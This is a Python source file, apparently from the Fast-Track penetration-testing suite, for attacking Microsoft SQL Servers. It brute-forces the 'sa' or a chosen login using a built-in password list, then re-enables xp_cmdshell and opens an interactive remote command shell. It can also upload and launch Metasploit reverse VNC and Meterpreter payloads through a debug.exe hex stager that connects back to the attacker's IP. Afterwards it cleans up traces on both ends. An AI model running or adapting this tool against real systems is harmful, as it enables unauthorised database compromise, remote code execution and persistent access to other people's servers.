#!/usr/bin/env python

import _mssql
import sys
import os
import time
import re
import subprocess
import pexpect
import socket

definepath=os.getcwd()
try:
   import psyco
   psyco.full()
except ImportError:
   pass
try:
    username=sys.argv[5]
except IndexError:
    username=raw_input("Enter username for SQL database (example:sa): ")

# define metasploit path
meta_path=file("%s/config/fasttrack_config" % (definepath),"r").readlines()
for line in meta_path:
    line=line.rstrip()
    match=re.search("METASPLOIT_PATH",line)
    if match:
       line=line.replace("METASPLOIT_PATH=","")
       metapath=line

# Define payload delivery here
import sqlping
def Payload_Delivery(choice,jumptosession):
    try:
          ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          ipaddr.connect(('google.com', 0))
          ipaddr.settimeout(2)
          ipaddr=ipaddr.getsockname()[0]
    except Exception:
          print "No internet connection detected, please enter your IP Address in manually."
          ipaddr=raw_input("Enter your IP here: ")
    port=raw_input("What port do you want the payload to connect to you on: ")
    if choice=='2':
       print "Metasploit Reverse VNC Upload Detected.."
       print "Launching MSFCLI VNC Handler."
       msflaunch=pexpect.spawn("""xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-60-* -T "Fast-Track SQL Bruter Metasploit VNC Inject Listener" -e %s/msfcli exploit/multi/handler PAYLOAD=windows/vncinject/reverse_tcp LHOST=%s LPORT=%s E""" % (metapath,ipaddr,port))
       print "Creating Metasploit Reverse VNC Payload.."                                               
       msfpayloadcreate=subprocess.Popen(r"%s/msfpayload windows/vncinject/reverse_tcp LHOST=%s LPORT=%s AUTOVNC=true X > %s/bin/appdata/metasploit" % (metapath,ipaddr,port,definepath), shell=True).wait()
       print "Prepping 64KB Debug Bypass stager for delivery..."
       h2bread=file("%s/bin/ftsrc/payload/h2b" % definepath,"r").readlines()
       query5=("""xp_cmdshell 'del h2bdelivery'""")
       time.sleep(5)                                                        
       printquery=mssql.execute_query(query5)
       for line1 in h2bread:
            line1=line1.rstrip()
            query5=("""xp_cmdshell '%s >> h2bdelivery'""" % (line1))                                                        
            printquery=mssql.execute_query(query5)
	    temp = line1.replace("echo ", "")
            print "Sending Payload: " + temp
       print "Converting our stager to an executable..."
       query5=("""xp_cmdshell 'debug<h2bdelivery'""")
       printquery=mssql.execute_query(query5)
       print "Cleaning up..."
       query5=("""xp_cmdshell 'del h2bdelivery'""")
       printquery=mssql.execute_query(query5)
       query5=("""xp_cmdshell 'rename MOO.BIN h2b.exe'""")
       printquery=mssql.execute_query(query5)
       print "Stager delivery complete."
       print "Coverting Metasploit to hex."
       import binascii
       filedelete=subprocess.Popen("rm %s/bin/appdata/metasploithex 2> /dev/null" % (definepath), shell=True).wait()
       filedelete=subprocess.Popen("rm %s/bin/appdata/metasploitdeliver 2> /dev/null" % (definepath), shell=True).wait()
       fileopen=file("%s/bin/appdata/metasploit" % (definepath), 'rb').readlines()
       filewrite=file("%s/bin/appdata/metasploithex" % (definepath),"w")
       for line in fileopen:
           line=binascii.hexlify(line)
           filewrite.write(line)
       filewrite.close()
       print "Done with payload hex conversion."
       print "Splitting payload for delivery, this may take a couple..."
       fileopen=open("%s/bin/appdata/metasploithex" % (definepath))
       createdel=subprocess.Popen("touch %s/bin/appdata/metasploitdeliver" % (definepath), shell=True).wait()
       filewrite=file("%s/bin/appdata/metasploitdeliver" % (definepath), "w")
       while fileopen:
           a=fileopen.read(900).rstrip()
  	   if a == "":
 	            break
           filewrite.write(a)
           filewrite.write("\n")
       filewrite.close()
       query5=("""xp_cmdshell 'del metasploit*'""")
       printquery=mssql.execute_query(query5)
       fileopen=file("%s/bin/appdata/metasploitdeliver" % (definepath), "r").readlines()
       import random
       randomgen=random.randrange(1,10000)
       for line in fileopen:
          line=line.rstrip()
          query5=("""xp_cmdshell 'echo %s>>metasploit%s'""" % (line,randomgen))
          printquery=mssql.execute_query(query5)
          print "Sending payload: "+line
       print "Metasploit payload delivered.."
       print "Converting our payload to binary, this may take a few..."
       query5=("""xp_cmdshell 'h2b metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       print "Cleaning up..."
       query5=("""xp_cmdshell 'del metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       query5=("""xp_cmdshell 'del h2b.exe'""")
       printquery=mssql.execute_query(query5)
       print "Launching payload, this could take up to a minute..."
       print "When finished, close the metasploit handler window to return to other compromised SQL Servers."
       query5=("""xp_cmdshell 'metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       pause=raw_input("Press enter to return back to compromised SQL Servers.")
    if choice=='3':
       print "Metasploit Reverse Meterpreter Upload Detected.."
       print "Launching Meterpreter Handler."
       msflaunch=pexpect.spawn("""xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-20-* -T "Fast-Track SQL Bruter Metasploit Meterpreter Listener" -e %s/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s E""" % (metapath,ipaddr,port))
       print "Creating Metasploit Reverse Meterpreter Payload.."                                               
       msfpayloadcreate=subprocess.Popen(r"%s/msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s/bin/appdata/metasploit" % (metapath,ipaddr,port,definepath), shell=True).wait()
       print "Prepping 64KB Debug Bypass stager for delivery..."
       h2bread=file("%s/bin/ftsrc/payload/h2b" % definepath,"r").readlines()
       query5=("""xp_cmdshell 'del h2bdelivery'""")                                                        
       printquery=mssql.execute_query(query5)
       for line1 in h2bread:
            line1=line1.rstrip()
            query5=("""xp_cmdshell '%s >> h2bdelivery'""" % (line1))                                                        
            printquery=mssql.execute_query(query5)
            temp=line1.replace("echo e ", "")
            print "Sending Payload: " + temp
       print "Converting our stager to an executable..."
       query5=("""xp_cmdshell 'debug<h2bdelivery'""")
       printquery=mssql.execute_query(query5)
       print "Cleaning up..."
       query5=("""xp_cmdshell 'del h2bdelivery'""")
       printquery=mssql.execute_query(query5)
       query5=("""xp_cmdshell 'rename MOO.BIN h2b.exe'""")
       printquery=mssql.execute_query(query5)
       print "Stager delivery complete."
       print "Coverting Metasploit to hex."
       import binascii
       filedelete=subprocess.Popen("rm %s/bin/appdata/metasploithex 2> /dev/null" % (definepath), shell=True).wait()
       filedelete=subprocess.Popen("rm %s/bin/appdata/metasploitdeliver 2> /dev/null" % (definepath), shell=True).wait()
       fileopen=file("%s/bin/appdata/metasploit" % (definepath), 'rb').readlines()
       filewrite=file("%s/bin/appdata/metasploithex" % (definepath),"w")
       for line in fileopen:
           line=binascii.hexlify(line)
           filewrite.write(line)
       filewrite.close()
       print "Done with payload hex conversion."
       print "Splitting payload for delivery, this may take a couple..."
       fileopen=open("%s/bin/appdata/metasploithex" % (definepath))
       createdel=subprocess.Popen("touch %s/bin/appdata/metasploitdeliver" % (definepath), shell=True).wait()
       filewrite=file("%s/bin/appdata/metasploitdeliver" % (definepath), "w")
       while fileopen:
           a=fileopen.read(900).rstrip()
  	   if a == "":
 	            break
           filewrite.write(a)
           filewrite.write("\n")
       filewrite.close()
       query5=("""xp_cmdshell 'del metasploit*'""")
       printquery=mssql.execute_query(query5)
       fileopen=file("%s/bin/appdata/metasploitdeliver" % (definepath), "r").readlines()
       import random
       randomgen=random.randrange(1,10000)
       for line in fileopen:
          line=line.rstrip()
          query5=("""xp_cmdshell 'echo %s>>metasploit%s'""" % (line,randomgen))
          printquery=mssql.execute_query(query5)
          print "Sending payload: "+line
       print "Metasploit payload delivered.."
       print "Converting our payload to binary, this may take a few..."
       query5=("""xp_cmdshell 'h2b metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       print "Cleaning up..."
       query5=("""xp_cmdshell 'del metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       query5=("""xp_cmdshell 'del h2b.exe'""")
       printquery=mssql.execute_query(query5)
       print "Launching payload, this could take up to a minute..."
       print "When finished, close the metasploit handler window to return to other compromised SQL Servers."
       query5=("""xp_cmdshell 'metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       pause=raw_input("Press enter to return back to compromised SQL Servers.")  
      # choice 4 = metasploit reflective vnc payload
    if choice=='4':
       print "Metasploit Reflective Reverse VNC Upload Detected.."
       print "Launching Meterpreter Handler."
       msflaunch=pexpect.spawn("""xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-20-* -T "Fast-Track SQL Bruter Metasploit Reflective VNC Listener" -e %s/msfcli exploit/multi/handler PAYLOAD=windows/reflectivevncinject/reverse_tcp LHOST=%s LPORT=%s E""" % (metapath,ipaddr,port))
       print "Creating Metasploit Reverse VNC Payload.."                                               
       msfpayloadcreate=subprocess.Popen(r"%s/msfpayload windows/reflectivevncinject/reverse_tcp LHOST=%s LPORT=%s X > %s/bin/appdata/metasploit" % (metapath,ipaddr,port,definepath), shell=True).wait()
       print "Prepping 64KB Debug Bypass stager for delivery..."
       h2bread=file("%s/bin/ftsrc/payload/h2b" % definepath,"r").readlines()
       query5=("""xp_cmdshell 'del h2bdelivery'""")                                                        
       printquery=mssql.execute_query(query5)
       for line1 in h2bread:
            line1=line1.rstrip()
            query5=("""xp_cmdshell '%s >> h2bdelivery'""" % (line1))                                                        
            printquery=mssql.execute_query(query5)
            temp=line1.replace("echo e ", "")
            print "Sending Payload: " + temp
       print "Converting our stager to an executable..."
       query5=("""xp_cmdshell 'debug<h2bdelivery'""")
       printquery=mssql.execute_query(query5)
       print "Cleaning up..."
       query5=("""xp_cmdshell 'del h2bdelivery'""")
       printquery=mssql.execute_query(query5)
       query5=("""xp_cmdshell 'rename MOO.BIN h2b.exe'""")
       printquery=mssql.execute_query(query5)
       print "Stager delivery complete."
       print "Coverting Metasploit to hex."
       import binascii
       filedelete=subprocess.Popen("rm %s/bin/appdata/metasploithex 2> /dev/null" % (definepath), shell=True).wait()
       filedelete=subprocess.Popen("rm %s/bin/appdata/metasploitdeliver 2> /dev/null" % (definepath), shell=True).wait()
       fileopen=file("%s/bin/appdata/metasploit" % (definepath), 'rb').readlines()
       filewrite=file("%s/bin/appdata/metasploithex" % (definepath),"w")
       for line in fileopen:
           line=binascii.hexlify(line)
           filewrite.write(line)
       filewrite.close()
       print "Done with payload hex conversion."
       print "Splitting payload for delivery, this may take a couple..."
       fileopen=open("%s/bin/appdata/metasploithex" % (definepath))
       createdel=subprocess.Popen("touch %s/bin/appdata/metasploitdeliver" % (definepath), shell=True).wait()
       filewrite=file("%s/bin/appdata/metasploitdeliver" % (definepath), "w")
       while fileopen:
           a=fileopen.read(900).rstrip()
  	   if a == "":
 	            break
           filewrite.write(a)
           filewrite.write("\n")
       filewrite.close()
       query5=("""xp_cmdshell 'del metasploit*'""")
       printquery=mssql.execute_query(query5)
       fileopen=file("%s/bin/appdata/metasploitdeliver" % (definepath), "r").readlines()
       import random
       randomgen=random.randrange(1,10000)
       for line in fileopen:
          line=line.rstrip()
          query5=("""xp_cmdshell 'echo %s>>metasploit%s'""" % (line,randomgen))
          printquery=mssql.execute_query(query5)
          print "Sending payload: "+line
       print "Metasploit payload delivered.."
       print "Converting our payload to binary, this may take a few..."
       query5=("""xp_cmdshell 'h2b metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       print "Cleaning up..."
       query5=("""xp_cmdshell 'del metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       query5=("""xp_cmdshell 'del h2b.exe'""")
       printquery=mssql.execute_query(query5)
       print "Launching payload, this could take up to a minute..."
       print "When finished, close the metasploit handler window to return to other compromised SQL Servers."
       query5=("""xp_cmdshell 'metasploit%s'""" % (randomgen))
       printquery=mssql.execute_query(query5)
       pause=raw_input("Press enter to return back to compromised SQL Servers.")                                                          

writefile=file("bin/appdata/sqlpassword","w")
writefile.write("password2\n\npassword\nsqlserver\nsql\npassword1\npassword123\ncomplexpassword\ndatabase\nserver\nchangeme\nchange\nsqlserver2000\nsqlserver2005\nSqlserver\nSqlServer\nPassword1\nPassword2\nP@ssw0rd\nP@ssw0rd!\nP@55w0rd!\nP@ssword!\nPassword!\npassword!\nsqlsvr\nsqlaccount\naccount\nsasa\nsa\nadministator\npass\nsql\nsqlsql\nmicrosoft\nsqlserver\nsa\nsasa\nwelcome\nsqlpass\nsqlpassword\nguessme\nbird\nP@55w0rd!\ntest\ndev\nqa\ngod\nsysadmin\nwater\ndirt\nair\nearth\ncompany\nsecret\nsqlpass123\n123456\nabcd123\nabc\nburp\nprivate\nunknown\nwicked\nalpine\ntrust\nmicrosoft\nsql2000\nsql2003\nsql2005\nsql2008\nvista\nxp\nnt\n98\n95\n2003\n2008")
writefile.close()
print "Brute forcing username: "+username+"\n"
print "Be patient this could take awhile...\n"
rmold=subprocess.Popen("rm bin/appdata/sqlsuccesslist.txt 2> /dev/null", shell=True)
rmold=subprocess.Popen("rm bin/appdata/*comp 2> /dev/null", shell=True)
try:
       for line in open('bin/appdata/sqlopen.txt','r').readlines():
           counter=0
           for line2 in open('bin/appdata/sqlpassword','r').readlines():
             try: 
                 line2=line2.rstrip()
                 print "Brute forcing password of %s on IP %s" % (line2,line)
                 mssql = _mssql.connect('%s' % (line),'%s' % (username),'%s' % (line2))
                 print 'SQL Server Compromised: "%s" with password of: "%s" on IP %s' % (username,line2,line)
                 counter=counter+1
                 filewrites=open("bin/appdata/sqlsuccesslist.txt", "a")
                 line=line.rstrip()
                 if counter == 1:
                    filewrites.write("%s,%s,%s" % (username,line2,line)+ '\n').rstrip()
                    counter=0
             except Exception: 
                 pass
except Exception :
          pass
try:
   filewrites.close()
except Exception:
   pass
if os.path.isfile("bin/appdata/sqlsuccesslist.txt"):
  while 1==1:
   try:
      fileread=open("bin/appdata/sqlsuccesslist.txt","r").readlines()
      count=1
      print "\n*******************************************\nThe following SQL Servers were compromised:\n*******************************************\n"
      for line in fileread:
          line=line.rstrip()
          line=tuple(line.split(","))
          print str(count)+". "+str(line[2]).rstrip()+ " *** U/N: "+str(line[0]).rstrip()+" P/W: "+str(line[1]).rstrip()+" ***"
          compsystem=open("bin/appdata/%scomp" % (count), "w")
          compsystem.write("%s,%s,%s" % (line[2],line[0],line[1]))
          count=int(count)+1
   except Exception,e:
          print e
   compsystem.close()
   print "\n*******************************************\n"
   print "To interact with system, enter the SQL Server number. \n\nExample: 1. 192.168.1.32 you would type 1"
   jumptosession=raw_input("\nEnter the number: ")
   if jumptosession == 'quit':
      print "\n\nExiting Fast-Track...\n\n"
      rmold=subprocess.Popen("rm bin/appdata/*comp 2> /dev/null;rm bin/appdata/sqlsuccesslist.txt 2> /dev/null;rm sqlopen.txt 2> /dev/null;rm SqlScan.txt 2> /dev/null;rm sqlpassword 2> /dev/null", shell=True).wait()
      sys.exit()
   try:
      fileread2=file("bin/appdata/%scomp" % (jumptosession),"r").readlines()
   except Exception:
      print "\nEnter the number of the session only. Example 1. 192.168.1.32. You would enter 1"
      jumptosession=raw_input("\nEnter the number of the SQL Server to jump interactive with. Example 1: ")
 
   try:
      choice=sys.argv[6]
   except Exception, e: 
      choice=raw_input("""Specify payload:

1. Standard Command Prompt
2. Metasploit Reverse VNC TCP (Requires Metasploit) 
3. Metasploit Meterpreter (Requires Metasploit)
4. Metasploit Reflective VNC DLL Injection (Requires Metasploit)
     
Enter number here: """)
   fileread2=file("bin/appdata/%scomp" % (jumptosession),"r").readlines()
   for line in fileread2:
      line=line.rstrip()
      line=tuple(line.split(","))
      mssql = _mssql.connect('%s' % (line[0]),'%s' % (line[1]),'%s' % line[2])
      print "\nEnabling: XP_Cmdshell..."
      enablexp="EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;"
      enablexp2="RECONFIGURE;"
      try:
          printquery1=mssql.execute_query(enablexp)
      except Exception:
                      pass
      try:
          printquery2=mssql.execute_query(enablexp2)
      except Exception:
                       pass
      mssql.select_db('master')
      print "Finished trying to re-enable xp_cmdshell stored procedure if disabled.\n"
      if choice == '1':
         print 'Jumping you into a shell one moment..\n'
         print '\nYou can always type "quit" to continue on to a seperate server.\n'
         time.sleep(2)
         mssql.select_db('master')
         while 1 == 1 :
                  commandprompt=raw_input("Enter your shell commands here: ")
                  if commandprompt == 'quit' :
                        break  
                  try:
                     query3="xp_cmdshell '%s'" % commandprompt
                     printquery=mssql.execute_query(query3)
                     for line in mssql:
                            line=str(line)
                            match=re.search("""\(\(\(\'output\'\, 1\)\,\)\, -1\, \[\(""", line)
                            if match:
                                line=line.replace("""((('output', 1),), -1, [(""", "")
                                line=line.replace(r"""\\\\\r""", "")
                                line=line.replace("""(None""", "")
                                line=line.replace("""('""", "")
                                line=line.replace("""',),""", "\n")
                                line=line.replace(""",)])""", "\n")
                                line=line.replace(""",),""", "\n")
                                line=line.replace("'","")
                                line=line.replace(r"\r","")
                                line=line.replace(r"\t","")
                                line=line.replace("None","")
                                line=line.replace(r"""The command completed with one or more errors.""", "\n")
                            print "\n\nShell brought to you by Fast-Track: Happy pwning" + "\n\n"+line
                  except Exception:
                     pass

      if choice == '2':
                      try:
                         Payload_Delivery(choice,jumptosession)
                      except Exception, e: print e
      if choice == '3':
                      try:
                         Payload_Delivery(choice,jumptosession)
                      except Exception, e: print e
      if choice == '4':
                      try:
                         Payload_Delivery(choice,jumptosession)
                      except Exception, e: print e
      if choice == '5':
                      try:
                         Payload_Delivery(choice,jumptosession)
                      except Exception, e: print e

if not os.path.isfile("bin/appdata/sqlsuccesslist.txt"):
   print "Sorry the brute force attack was unsuccessful. Better luck next time!\n"
deloldfile=subprocess.Popen("rm sqlpassword 2> /dev/null;rm SqlScan.txt 2> /dev/null;rm sqlopen.txt 2> /dev/null;rm bin/appdata/1comp 2> /dev/null;rm bin/appdata/metasploit 2> /dev/null;rm metasploitdeliver 2> /dev/null;rm metasploithex 2> /dev/null;rm sqlsuccesslist.txt 2> /dev/null", shell=True).wait()


